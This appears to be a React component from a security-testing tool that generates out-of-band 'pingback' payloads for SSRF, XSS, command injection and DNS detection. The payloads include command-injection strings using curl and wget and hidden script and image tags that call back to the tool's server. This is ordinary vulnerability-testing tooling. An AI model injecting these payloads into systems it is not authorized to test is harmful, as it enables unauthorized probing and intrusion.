"use client"

import { useState } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Copy, Download } from "lucide-react"

interface PayloadGeneratorProps {
  baseUrl: string
}

export function DNSPayloadGenerator({ baseUrl }: PayloadGeneratorProps) {
  const [testType, setTestType] = useState("ssrf")
  const [customDomain, setCustomDomain] = useState("")
  const [payloadContext, setPayloadContext] = useState("")

  const generatePayload = () => {
    const timestamp = Date.now()
    const domain = customDomain || `${timestamp}.pingback.test`

    const payloads = {
      ssrf: `${baseUrl}/api/pingback?ssrf=${timestamp}&domain=${domain}`,
      xss: `<img src="${baseUrl}/api/pingback?xss=${timestamp}&domain=${domain}" style="display:none">`,
      rce: `; curl "${baseUrl}/api/pingback?rce=${timestamp}&domain=${domain}" ;`,
      dns: `nslookup ${timestamp}.${domain}`,
      http: `curl -X POST "${baseUrl}/api/pingback" -d "test=${timestamp}&domain=${domain}"`,
    }

    return payloads[testType as keyof typeof payloads] || payloads.http
  }

  const copyPayload = () => {
    const payload = generatePayload()
    navigator.clipboard.writeText(payload)
  }

  const downloadPayloads = () => {
    const timestamp = Date.now()
    const domain = customDomain || `${timestamp}.pingback.test`

    const allPayloads = [
      `# SSRF Detection`,
      `${baseUrl}/api/pingback?ssrf=${timestamp}&domain=${domain}`,
      ``,
      `# XSS Detection`,
      `<img src="${baseUrl}/api/pingback?xss=${timestamp}&domain=${domain}" style="display:none">`,
      `<script>fetch('${baseUrl}/api/pingback?xss=${timestamp}&domain=${domain}')</script>`,
      ``,
      `# Command Injection`,
      `; curl "${baseUrl}/api/pingback?rce=${timestamp}&domain=${domain}" ;`,
      `| wget "${baseUrl}/api/pingback?rce=${timestamp}&domain=${domain}"`,
      `\`curl "${baseUrl}/api/pingback?rce=${timestamp}&domain=${domain}"\``,
      ``,
      `# DNS Queries`,
      `nslookup ${timestamp}.${domain}`,
      `dig ${timestamp}.${domain}`,
      `host ${timestamp}.${domain}`,
      ``,
      `# HTTP Requests`,
      `curl -X GET "${baseUrl}/api/pingback?test=${timestamp}&domain=${domain}"`,
      `curl -X POST "${baseUrl}/api/pingback" -d "test=${timestamp}&domain=${domain}"`,
      `wget "${baseUrl}/api/pingback?test=${timestamp}&domain=${domain}"`,
    ].join("\n")

    const blob = new Blob([allPayloads], { type: "text/plain" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `pingback-payloads-${timestamp}.txt`
    a.click()
    URL.revokeObjectURL(url)
  }

  return (
    <Card>
      <CardHeader>
        <CardTitle>Payload Generator</CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="grid gap-4 md:grid-cols-2">
          <div>
            <Label htmlFor="test-type">Test Type</Label>
            <Select value={testType} onValueChange={setTestType}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="ssrf">SSRF Detection</SelectItem>
                <SelectItem value="xss">XSS Detection</SelectItem>
                <SelectItem value="rce">Command Injection</SelectItem>
                <SelectItem value="dns">DNS Query</SelectItem>
                <SelectItem value="http">HTTP Request</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <div>
            <Label htmlFor="custom-domain">Custom Domain (Optional)</Label>
            <Input
              id="custom-domain"
              placeholder="your-domain.com"
              value={customDomain}
              onChange={(e) => setCustomDomain(e.target.value)}
            />
          </div>
        </div>

        <div>
          <Label htmlFor="payload-context">Payload Context</Label>
          <Input
            id="payload-context"
            placeholder="Additional context or identifier"
            value={payloadContext}
            onChange={(e) => setPayloadContext(e.target.value)}
          />
        </div>

        <div className="bg-muted p-3 rounded">
          <code className="text-sm break-all">{generatePayload()}</code>
        </div>

        <div className="flex gap-2">
          <Button onClick={copyPayload} className="flex-1">
            <Copy className="h-4 w-4 mr-2" />
            Copy Payload
          </Button>
          <Button onClick={downloadPayloads} variant="outline">
            <Download className="h-4 w-4 mr-2" />
            Download All
          </Button>
        </div>
      </CardContent>
    </Card>
  )
}
